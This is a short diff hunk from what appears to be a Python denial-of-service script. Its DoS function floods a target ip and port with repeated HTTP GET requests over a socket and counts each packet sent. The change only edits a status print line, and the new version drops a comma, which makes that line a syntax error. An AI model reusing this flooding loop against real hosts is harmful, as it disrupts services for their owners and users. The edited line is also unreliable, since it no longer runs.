@@ -43,7 +43,7 @@ def DoS():
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print("---🚀 PACKET " + str(" SENT AT: " + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()), "🚀---")
+                        print("---🚀 PACKET " + str(" SENT AT: " + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) "🚀---")
                         Count.packetCounter = Count.packetCounter + 1
                     except socket.error:
                         print("[!] Error, Maybe host is down.")
